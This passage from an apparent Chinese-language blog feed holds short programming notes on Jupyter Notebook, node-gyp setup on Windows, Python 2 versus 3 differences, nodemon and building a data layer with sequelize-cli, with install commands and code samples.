<h1 id="启动Jupyter-Notebook"><a href="#启动Jupyter-Notebook" class="headerlink" title="启动Jupyter Notebook"></a>启动Jupyter Notebook</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure>

<h1 id="使用指南"><a href="#使用指南" class="headerlink" title="使用指南"></a>使用指南</h1><ul>
<li>单元格执行状态</li>
</ul>
<p>单元格的执行状态对于复杂度高的代码，往往会意味着更长的执行等待时间。在Jupyter Notebook 中，当一个单元格处于执行状态时，单元格前面会出现 In [*] 符号，只有执行完成的单元格, [] 中的 * 才会变成相应的 序号。</p>
<p>除此之外，你可以通过页面右上角的 Kernel 状态指示器判断内核占用情况。如果 Python 字符右边出现了实心圆圈 ◉，代表内核处于占有状态。而空心圆圈 ◯ 则代表内核处于空闲状态。当然，也可能出现链接断开的符号，那就代表着内核已经断开链接，你可能需要刷新页面或重启实验环境。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Jupyter" target="_blank" rel="noopener">Jupyter</a>,by wikipedia.</li>
<li><a href="https://jupyter.org/install.html" target="_blank" rel="noopener">Installing the Jupyter Software</a>,by jupyter.</li>
<li><a href="https://stackoverflow.com/questions/25333732/matplotlib-animation-not-working-in-ipython-notebook-blank-plot" target="_blank" rel="noopener">Matplotlib animation not working in IPython Notebook (blank plot)</a>,by stackoverflow.</li>
<li><a href="https://blog.csdn.net/zhanlang619/article/details/122786575" target="_blank" rel="noopener">Jupyter Notebook使用指南</a>,by zhanlang619.</li>
<li><a href="https://blog.csdn.net/weixin_44852067/article/details/122220945" target="_blank" rel="noopener">Jupyter中markdown的操作技巧</a>,by 那一年_我九岁.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>node-gyp使用帮助</title>
    <url>/2018/12/16/node-gyp%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>node-gyp是为了编译nodejs addon模块而构建的跨平台命令行工具。nodejs addon模块使用c++语言编写，在源代码级别进行分发，通过node-gyp实现跨平台的编译安装。</p>
<h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><p>node-gyp源于gyp。gyp是一个用来生成项目文件的工具，刚开始设计给chromium项目使用的。它可以从平台无关的配置生成平台相关的Visual Studio、Xcode、Makefile的项目文件，然后调用 vsbuild、xcode、gcc等编译平台来编译。这就不需要花额外的时间处理每个平台不同的项目配置以及项目之间的依赖关系。</p>
<p>nodejs addon模块采用源代码分发，安装需要根据不同平台采用合适的编译器编译安装，这就是node-gyp项目诞生的原由。</p>
<h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><h2 id="安装node-gyp"><a href="#安装node-gyp" class="headerlink" title="安装node-gyp"></a>安装node-gyp</h2><p>在上线情况下，使用如下命令安装node-gyp：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install -g node-gyp</span><br></pre></td></tr></table></figure>

<h2 id="安装C-编译器"><a href="#安装C-编译器" class="headerlink" title="安装C++编译器"></a>安装C++编译器</h2><p>根据操作系统平台的不同，需安装对应的编译器，以方便node-gyp调用。以Windows平台为例，安装VC++编译器有两种方法：</p>
<ul>
<li><p>直接安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 以管理员身份打开cmd或powershell</span><br><span class="line"></span><br><span class="line">npm install --global --production windows-build-tools</span><br></pre></td></tr></table></figure>
</li>
<li><p>手动安装</p>
<ul>
<li>安装Visual C++构建环境： 使用Visual Studio Build Tools的Visual C++ build tools工作负载或者Visual Studio 2017 Community的Desktop development with C++工作负载。</li>
<li>安装Python 2.7，不支持python3，然后运行npm config set python python2.7</li>
<li>在cmd中运行npm config set msvs_version 2017</li>
</ul>
</li>
</ul>
<p>手动安装Visual C++构建环境的命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用Visual Studio Build Tools的Visual C++ build tools工作负载，确保安装win10sdk，编译nodejs源码时需要</span><br><span class="line"></span><br><span class="line">.\vs_buildtools__2041717674.1536666005.exe --layout d:\vc2017_offline --lang zh-CN --add Microsoft.VisualStudio.Workload.MSBuildTools --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended</span><br><span class="line"></span><br><span class="line"># 使用Visual Studio 2017 Community的Desktop development with C++工作负载</span><br><span class="line"></span><br><span class="line">.\vs_community__208176120.1522073957.exe --layout e:\vs2017_offline --lang zh-CN --add Microsoft.VisualStudio.Workload.CoreEditor --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended</span><br></pre></td></tr></table></figure>

<h2 id="node-gyp编译测试"><a href="#node-gyp编译测试" class="headerlink" title="node-gyp编译测试"></a>node-gyp编译测试</h2><p>以在Win10平台编译nodejs addon模块为例，在离线情况使用如下命令测试node-gyp是否工作正常：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node-gyp configure --nodedir&#x3D;d:\node-v8.11.3</span><br><span class="line"></span><br><span class="line">node-gyp build</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.zhihu.com/question/36291768" target="_blank" rel="noopener">node-gyp的作用是什么?</a>,by zhihu.</li>
<li><a href="https://github.com/nodejs/node-gyp" target="_blank" rel="noopener">node-gyp</a>, by nodejs</li>
<li><a href="https://github.com/felixrieseberg/windows-build-tools" target="_blank" rel="noopener">Windows-Build-Tools</a>, by felixrieseberg.</li>
<li><a href="https://blog.csdn.net/jxyb2012/article/details/83009765" target="_blank" rel="noopener">Vistual Studio Community 2017 30天许可证过期</a>,by 井底一蛤蟆.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>python3与python2的区别与兼容</title>
    <url>/2018/05/26/python3%E4%B8%8Epython2%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E5%85%BC%E5%AE%B9/</url>
    <content><![CDATA[<p>Python是一种广泛使用的高级编程语言，属于通用型编程语言，由吉多·范罗苏姆创造，第一版发布于1991年。可以视之为一种改良（加入一些其他编程语言的优点，如面向对象）的LISP。作为一种解释型语言，Python的设计哲学强调代码的可读性和简洁的语法（尤其是使用空格缩进划分代码块，而非使用大括号或者关键词）。相比于C++或Java，Python让开发者能够用更少的代码表达想法。不管是小型还是大型程序，该语言都试图让程序的结构清晰明了。</p>
<p>与Scheme、Ruby、Perl、Tcl等动态类型编程语言一样，Python拥有动态类型系统和垃圾回收功能，能够自动管理内存使用，并且支持多种编程范式，包括面向对象、命令式、函数式和过程式编程。其本身拥有一个巨大而广泛的标准库。</p>
<p>Python 解释器本身几乎可以在所有的操作系统中运行。Python的正式解释器CPython是用C语言编写的、是一个由社区驱动的自由软件，目前由Python软件基金会管理。</p>
<h1 id="python3与python2区别"><a href="#python3与python2区别" class="headerlink" title="python3与python2区别"></a>python3与python2区别</h1><h2 id="print函数"><a href="#print函数" class="headerlink" title="print函数"></a>print函数</h2><p>Python 2 的 print 声明在Python 3中已经被 print() 函数取代</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2</span><br><span class="line">print &#39;Hello, World!&#39;</span><br><span class="line"></span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">print(&#39;Hello, World!&#39;)</span><br></pre></td></tr></table></figure>
<h2 id="整除"><a href="#整除" class="headerlink" title="整除"></a>整除</h2><p>/是精确除法，//是向下取整除法，%是求模。</p>
<p>//和%运算符在2和3版本中一样，但是运算符/不一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2</span><br><span class="line">&gt;&gt;&gt; 3 &#x2F; 2</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; 3 &#x2F;&#x2F; 2</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; 3 &#x2F; 2.0</span><br><span class="line">1.5</span><br><span class="line">&gt;&gt;&gt; 3 &#x2F;&#x2F; 2.0</span><br><span class="line">1.0</span><br><span class="line"></span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">&gt;&gt;&gt; 3 &#x2F; 2</span><br><span class="line">1.5</span><br><span class="line">&gt;&gt;&gt; 3 &#x2F;&#x2F; 2</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; 3 &#x2F; 2.0</span><br><span class="line">1.5</span><br><span class="line">&gt;&gt;&gt; 3 &#x2F;&#x2F; 2.0</span><br><span class="line">1.0</span><br></pre></td></tr></table></figure>

<h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>由于历史遗留问题，Python 2.x版本虽然支持Unicode，但在语法上需要’xxx’和u’xxx’两种字符串表示方式。</p>
<p>在Python 3.x版本中，把’xxx’和u’xxx’统一成Unicode编码，即写不写前缀u都是一样的，而以字节形式表示的字符串则必须加上b前缀：b’xxx’。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2</span><br><span class="line"></span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">&gt;&gt;&gt; 中国 &#x3D; &#39;china&#39; </span><br><span class="line">&gt;&gt;&gt; print(中国)</span><br><span class="line">china</span><br></pre></td></tr></table></figure>

<h2 id="xrange模块"><a href="#xrange模块" class="headerlink" title="xrange模块"></a>xrange模块</h2><p>在 Python 2 中 xrange() 创建迭代对象的用法是非常流行的。比如： for 循环或者是列表/集合/字典推导式。</p>
<p>在 Python 3 中，range() 是像 xrange() 那样实现以至于一个专门的 xrange() 函数都不再存在（在 Python 3 中 xrange() 会抛出命名异常）。</p>
<h2 id="不等运算符"><a href="#不等运算符" class="headerlink" title="不等运算符"></a>不等运算符</h2><p>Python 2.x中不等于有两种写法 != 和 &lt;&gt;</p>
<p>Python 3.x中去掉了&lt;&gt;, 只有!=一种写法</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul>
<li>Py3.X去除了long类型，现在只有一种整型——int，但它的行为就像2.X版本的long</li>
<li>新增了bytes类型，对应于2.X版本的八位串</li>
<li>dict的.keys()、.items 和.values()方法返回迭代器，而之前的iterkeys()等函数都被废弃。同时去掉的还有 dict.has_key()，用 in替代它吧 。</li>
</ul>
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><ul>
<li>在 Python 3 中处理异常也轻微的改变了，在 Python 3 中我们现在使用 as 作为关键词。</li>
<li>捕获异常的语法由 except exc, var 改为 except exc as var。<br>使用语法except (exc1, exc2) as var可以同时捕获多种类别的异常。 Python 2.6已经支持这两种语法。</li>
</ul>
<h2 id="解析用户的输入"><a href="#解析用户的输入" class="headerlink" title="解析用户的输入"></a>解析用户的输入</h2><ul>
<li><p>在python2.x中raw_input()和input()，两个函数都存在，其中区别为</p>
<p>  raw_input()—将所有输入作为字符串看待，返回字符串类型</p>
<p>  input()—–只能接收“数字”的输入，在对待纯数字输入时具有自己的特性，它返回所输入的数字的类型（int, float）</p>
</li>
<li><p>在python3.x中raw_input()和input()进行了整合，去除了raw_input()，仅保留了input()函数，其接收任意任性输入，将所有输入默认为字符串处理，并返回字符串类型。</p>
</li>
</ul>
<h2 id="返回可迭代对象，而不是列表"><a href="#返回可迭代对象，而不是列表" class="headerlink" title="返回可迭代对象，而不是列表"></a>返回可迭代对象，而不是列表</h2><p>如果在 xrange 章节看到的，现在在 Python 3 中一些方法和函数返回迭代对象 — 代替 Python 2 中的列表。</p>
<p>因为我们通常那些遍历只有一次，我认为这个改变对节约内存很有意义。尽管如此，它也是可能的，相对于生成器 —- 如需要遍历多次。它是不那么高效的。</p>
<p>而对于那些情况下，我们真正需要的是列表对象，我们可以通过 list() 函数简单的把迭代对象转换成一个列表。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2</span><br><span class="line">&gt;&gt;&gt; print range(3) </span><br><span class="line">[0, 1, 2]</span><br><span class="line">&gt;&gt;&gt; print type(range(3))</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br><span class="line"></span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">&gt;&gt;&gt; print(range(3))</span><br><span class="line">range(0, 3)</span><br><span class="line">&gt;&gt;&gt; print(type(range(3)))</span><br><span class="line">&lt;class &#39;range&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print(list(range(3)))</span><br><span class="line">[0, 1, 2]</span><br></pre></td></tr></table></figure>
<h2 id="For循环变量和全局命名空间泄漏"><a href="#For循环变量和全局命名空间泄漏" class="headerlink" title="For循环变量和全局命名空间泄漏"></a>For循环变量和全局命名空间泄漏</h2><p>在 Python 3.x 中 for 循环变量不会再导致命名空间泄漏。</p>
<p>在 Python 3.x 中做了一个改变，在 What’s New In Python 3.0 中有如下描述：<br>“列表推导不再支持 [… for var in item1, item2, …] 这样的语法。使用 [… for var in (item1, item2, …)] 代替。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2</span><br><span class="line">&gt;&gt;&gt; i &#x3D; 1</span><br><span class="line">&gt;&gt;&gt; print &#39;before: i &#x3D;&#39;, i</span><br><span class="line">before: i &#x3D; 1</span><br><span class="line">&gt;&gt;&gt; print &#39;comprehension: &#39;, [i for i in range(5)]</span><br><span class="line">comprehension:  [0, 1, 2, 3, 4]</span><br><span class="line">&gt;&gt;&gt; print &#39;after: i &#x3D;&#39;, i</span><br><span class="line">after: i &#x3D; 4</span><br><span class="line"></span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">&gt;&gt;&gt; i &#x3D; 1</span><br><span class="line">&gt;&gt;&gt; print(&#39;before: i &#x3D;&#39;, i)</span><br><span class="line">before: i &#x3D; 1</span><br><span class="line">&gt;&gt;&gt; print(&#39;comprehension:&#39;, [i for i in range(5)])</span><br><span class="line">comprehension: [0, 1, 2, 3, 4]</span><br><span class="line">&gt;&gt;&gt; print(&#39;after: i &#x3D;&#39;, i)</span><br><span class="line">after: i &#x3D; 1</span><br></pre></td></tr></table></figure>

<h1 id="兼容python3与python2"><a href="#兼容python3与python2" class="headerlink" title="兼容python3与python2"></a>兼容python3与python2</h1><p>当前python3的普及还不尽人意，因此编写的python程序能同时兼容python2与python3是十分必要的。下面介绍同时支持python2与python3的方法。</p>
<ul>
<li>放弃python 2.6之前的python版本</li>
<li>使用 2to3 工具对代码检查</li>
<li>使用python -3执行python程序</li>
<li>from <strong>future</strong> import<br>  “from <strong>future</strong> import”后即可使使用python的未来特性了。python的完整future特性可见 <strong>future</strong> 。python3中所有字符都变成了unicode。在python2中unicode字符在定义时需要在字符前面加 u，但在3中则不需要家u，而且在加u后程序会无法编译通过。为了解决该问题可以 “from future import unicode_literals” ，这样python2中字符的行为将和python3中保持一致，python2中定义普通字符将自动识别为unicode。</li>
<li>import问题<br>  python3中“少”了很多python2的包，在大多情况下这些包之是改了个名字而已。我们可以在import的时候对这些问题进行处理。  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:#python2</span><br><span class="line">    from UserDict import UserDict</span><br><span class="line">    #建议按照python3的名字进行import</span><br><span class="line">    from UserDict import DictMixin as MutableMapping</span><br><span class="line">except ImportError:#python3</span><br><span class="line">    from collections import UserDict</span><br><span class="line">    from collections import MutableMapping</span><br></pre></td></tr></table></figure></li>
<li>使用python3的方式写程序</li>
<li>检查当前运行的python版本  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">if sys.version &gt; &#39;3&#39;:</span><br><span class="line">    PY3 &#x3D; True</span><br><span class="line">else:</span><br><span class="line">    PY3 &#x3D; False</span><br></pre></td></tr></table></figure></li>
<li>six<br>不推荐使用six。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Python" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Python</a>, by wikipedia</li>
<li><a href="https://www.jianshu.com/p/85583e032eb8" target="_blank" rel="noopener">https://www.jianshu.com/p/85583e032eb8</a>, by EarthChen</li>
<li><a href="http://python.jobbole.com/83987/" target="_blank" rel="noopener">http://python.jobbole.com/83987/</a>, by 天地一沙鸥</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python项目组织方法</title>
    <url>/2022/03/04/python%E9%A1%B9%E7%9B%AE%E7%BB%84%E7%BB%87%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>如何科学的组织是构建大型项目的基础，可是人员分工协作的前提。下面介绍Python项目的组织方法</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/ningskyer/articles/6025964.html" target="_blank" rel="noopener">Python 大型项目基础：包、模块、类的组织</a>,by 小天儿.</li>
<li><a href="https://marlous.github.io/2019/04/03/Python-%E8%BD%AF%E4%BB%B6%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E7%BB%84%E7%BB%87/" target="_blank" rel="noopener">Python 软件项目文件结构组织</a>,by Marlous.</li>
<li><a href="https://pyguide.readthedocs.io/zh_CN/latest/writing/structure.html" target="_blank" rel="noopener">组织好你的项目</a>,by hitchhiker.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>pytorch学习笔记</title>
    <url>/2021/06/17/pytorch%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>PyTorch 是基于以下两个目的而打造的python科学计算框架：</p>
<ul>
<li>无缝替换NumPy，并且通过利用GPU的算力来实现神经网络的加速。</li>
<li>通过自动微分机制，来让神经网络的实现变得更加容易。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/qq_27825451/article/details/90550890" target="_blank" rel="noopener">pytorch教程之nn.Module类详解——使用Module类来自定义模型</a>,by LoveMIss-Y.</li>
<li><a href="https://pytorch.apachecn.org/" target="_blank" rel="noopener">PyTorch 中文教程</a>,by apachecn.</li>
<li><a href="https://blog.csdn.net/weixin_42018112/article/details/90899559" target="_blank" rel="noopener">torch.distributions 详解</a>,by Vic_Hao.</li>
<li><a href="https://stackoverflow.com/questions/54635355/what-does-log-prob-do" target="_blank" rel="noopener">What does log_prob do?</a>,by stackoverflow.</li>
<li><a href="https://zhuanlan.zhihu.com/p/344938643" target="_blank" rel="noopener">VAE中的重参数化技巧-reparameterization trick</a>,by Weibo Mao.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>nodemon入门简介</title>
    <url>/2019/07/23/nodemon%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>Nodemon是一个用于nodejs开发的工具程序，它将监视nodejs源中的任何更改并自动重新启动服务器。</p>
<p>nodemon不需要对代码或开发方法进行任何其他更改。 nodemon是node的替换包装器，在执行脚本时使用nodemon替换命令行上的单词node即可。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g nodemon</span><br></pre></td></tr></table></figure>

<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nodemon [your node app]</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://github.com/remy/nodemon" target="_blank" rel="noopener">nodemon</a>,by remy.</li>
<li><a href="https://bubkoo.com/2014/12/02/use-nodemon-with-node-applications/" target="_blank" rel="noopener">在 Express 开发中使用 nodemon</a>,by bubkoo.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>sequelize-cli使用经验总结</title>
    <url>/2018/06/22/sequelize-cli%E4%BD%BF%E7%94%A8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>Sequelize 是一个基于 promise 的 Node.js ORM, 目前支持 Postgres, MySQL, SQLite 和 Microsoft SQL Server. 它具有强大的事务支持, 关联关系, 读取和复制等功能<sup>[2]</sup>. 下面主要介绍如何使用sequelize-cli工具快速构建nodejs的数据访问层。</p>
<h1 id="基于express创建nodejs-web应用"><a href="#基于express创建nodejs-web应用" class="headerlink" title="基于express创建nodejs web应用"></a>基于express创建nodejs web应用</h1><p>基于express建立nodejs的web应用，在此基础上再使用sequlize建立数据访问层和数据库。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir myapp</span><br><span class="line">cd myapp</span><br><span class="line">express</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<h1 id="基于sequelize创建数据访问层和数据库"><a href="#基于sequelize创建数据访问层和数据库" class="headerlink" title="基于sequelize创建数据访问层和数据库"></a>基于sequelize创建数据访问层和数据库</h1><h2 id="安装sequlize"><a href="#安装sequlize" class="headerlink" title="安装sequlize"></a>安装sequlize</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save sequelize</span><br><span class="line">npm install --save mysql2</span><br></pre></td></tr></table></figure>
<h2 id="安装sequelize-cli"><a href="#安装sequelize-cli" class="headerlink" title="安装sequelize-cli"></a>安装sequelize-cli</h2><p>首先应安装sequelize-cli工具，可以选择全局安装，也可以选择本地安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save-dev sequelize-cli</span><br><span class="line">npm install -g sequelize-cli</span><br></pre></td></tr></table></figure>
<h2 id="建立初始的ORM引导框架"><a href="#建立初始的ORM引导框架" class="headerlink" title="建立初始的ORM引导框架"></a>建立初始的ORM引导框架</h2><p>使用如下命令在Nodejs Web应用中建立初始的数据访问层。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir db</span><br><span class="line">cd db</span><br><span class="line">..&#x2F;node_modules&#x2F;.bin&#x2F;sequelize init</span><br></pre></td></tr></table></figure>
<p>这将创建以下文件夹:</p>
<ul>
<li>config, 包含配置文件，它告诉CLI如何连接数据库</li>
<li>models,包含您的项目的所有模型</li>
<li>migrations, 包含所有迁移文件</li>
<li>seeders, 包含所有种子文件</li>
</ul>
<h2 id="修改配置文件以连接到数据库管理系统，并创建数据库"><a href="#修改配置文件以连接到数据库管理系统，并创建数据库" class="headerlink" title="修改配置文件以连接到数据库管理系统，并创建数据库"></a>修改配置文件以连接到数据库管理系统，并创建数据库</h2><p>在建立模型之前，应先修改config/config.json，以告诉 CLI 如何连接到数据库。config/config.json内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;development&quot;: &#123;</span><br><span class="line">    &quot;username&quot;: &quot;root&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;root&quot;,</span><br><span class="line">    &quot;database&quot;: &quot;database_development&quot;,</span><br><span class="line">    &quot;host&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;dialect&quot;: &quot;mysql&quot;,</span><br><span class="line">    &quot;pool&quot;:&#123;</span><br><span class="line">        &quot;max&quot;: 5,</span><br><span class="line">        &quot;min&quot;: 0,</span><br><span class="line">        &quot;idle&quot;: 10000</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;timezone&quot;: &quot;+08:00&quot;,</span><br><span class="line">    &quot;define&quot;:&#123;</span><br><span class="line">      &quot;charset&quot;: &quot;utf8&quot;,</span><br><span class="line">      &quot;dialectOptions&quot;:&#123;</span><br><span class="line">          &quot;collate&quot;: &quot;utf8_general_ci&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;test&quot;: &#123;</span><br><span class="line">    &quot;username&quot;: &quot;root&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;root&quot;,</span><br><span class="line">    &quot;database&quot;: &quot;database_test&quot;,</span><br><span class="line">    &quot;host&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;dialect&quot;: &quot;mysql&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;production&quot;: &#123;</span><br><span class="line">    &quot;username&quot;: &quot;root&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;root&quot;,</span><br><span class="line">    &quot;database&quot;: &quot;database_test&quot;,</span><br><span class="line">    &quot;host&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;dialect&quot;: &quot;mysql&quot;,</span><br><span class="line">    &quot;pool&quot;:&#123;</span><br><span class="line">        &quot;max&quot;: 5,</span><br><span class="line">        &quot;min&quot;: 0,</span><br><span class="line">        &quot;idle&quot;: 10000</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;timezone&quot;: &quot;+08:00&quot;,</span><br><span class="line">    &quot;define&quot;:&#123;</span><br><span class="line">      &quot;charset&quot;: &quot;utf8&quot;,</span><br><span class="line">      &quot;dialectOptions&quot;:&#123;</span><br><span class="line">          &quot;collate&quot;: &quot;utf8_general_ci&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述配置修改了数据库的字符集，使之能支持中文。当然在创建数据库之前，应配置mysql数据库管理系，使其支持utf8字符集。可执行如下命令查看其支持的字符集，如果其不支持uft字符集，请按照参考链接[3]进行修改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;%char%&#39;;</span><br><span class="line">+--------------------------+---------------------------------------------------------+</span><br><span class="line">| Variable_name            | Value                                                   |</span><br><span class="line">+--------------------------+---------------------------------------------------------+</span><br><span class="line">| character_set_client     | utf8                                                    |</span><br><span class="line">| character_set_connection | utf8                                                    |</span><br><span class="line">| character_set_database   | utf8                                                    |</span><br><span class="line">| character_set_filesystem | binary                                                  |</span><br><span class="line">| character_set_results    | utf8                                                    |</span><br><span class="line">| character_set_server     | utf8                                                    |</span><br><span class="line">| character_set_system     | utf8                                                    |</span><br><span class="line">| character_sets_dir       | C:\Program Files\MySQL\MySQL Server 5.5\share\charsets\ |</span><br><span class="line">+--------------------------+---------------------------------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>使用如下命令创建数据库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;node_modules&#x2F;.bin&#x2F;sequelize db:create</span><br></pre></td></tr></table></figure>

<p>使用如下命令删除数据库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;node_modules&#x2F;.bin&#x2F;sequelize db:drop</span><br></pre></td></tr></table></figure>

<h2 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h2><p>我们将使用 model:generate 命令。 此命令需要两个选项：</p>
<ul>
<li>name, 模型的名称</li>
<li>attributes, 模型的属性列表</li>
</ul>
<p>创建一个名叫 User 的模型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;node_modules&#x2F;.bin&#x2F;sequelize model:generate --name User --attributes firstName:string,lastName:string,email:string</span><br></pre></td></tr></table></figure>
<p>这将发生以下事情:</p>
<ul>
<li>在 models 文件夹中创建了一个 user 模型文件</li>
<li>在 migrations 文件夹中创建了一个名字像 XXXXXXXXXXXXXX-create-user.js 的迁移文件</li>
</ul>
<p><b>注意:</b> _Sequelize 将只使用模型文件，它是表描述。另一边，迁移文件是该模型的更改，或更具体的是说 CLI 所使用的表。 处理迁移，如提交或日志，以进行数据库的某些更改。</p>
<p>再创建一个名为Role的模型，它跟User是一对多的关系：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;node_modules&#x2F;.bin&#x2F;sequelize model:generate --name Role --attributes roleName:string</span><br></pre></td></tr></table></figure>

<h2 id="定义关系"><a href="#定义关系" class="headerlink" title="定义关系"></a>定义关系</h2><p>Role和User是一对多的关系，因此需要修改它们的模型定义。<br>修改models/role.js如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line">module.exports &#x3D; (sequelize, DataTypes) &#x3D;&gt; &#123;</span><br><span class="line">  var Role &#x3D; sequelize.define(&#39;Role&#39;, &#123;</span><br><span class="line">    roleName: DataTypes.STRING</span><br><span class="line">  &#125;, &#123;&#125;);</span><br><span class="line">  Role.associate &#x3D; function(models) &#123;</span><br><span class="line">    &#x2F;&#x2F; associations can be defined here</span><br><span class="line">    Role.hasMany(models.User)</span><br><span class="line">  &#125;;</span><br><span class="line">  return Role;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
